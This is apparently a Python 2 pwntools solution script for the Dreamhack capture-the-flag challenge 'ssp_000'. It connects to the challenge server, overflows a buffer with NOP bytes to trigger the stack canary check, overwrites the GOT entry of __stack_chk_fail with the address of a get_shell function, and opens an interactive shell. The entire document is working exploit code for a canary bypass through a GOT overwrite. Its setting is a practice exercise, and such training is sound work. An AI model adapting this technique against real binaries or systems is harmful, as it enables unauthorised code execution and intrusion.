#!/usr/bin/env python2

from pwn import *

e = ELF("./ssp_000")

HOST = "host1.dreamhack.games"
PORT = 21247

conn = remote(HOST, PORT)

conn.sendline(asm("nop")*0x80)
conn.sendlineafter("Addr : ", str(e.got["__stack_chk_fail"]))
conn.sendlineafter("Value : ", str(e.symbols["get_shell"]))
conn.interactive()
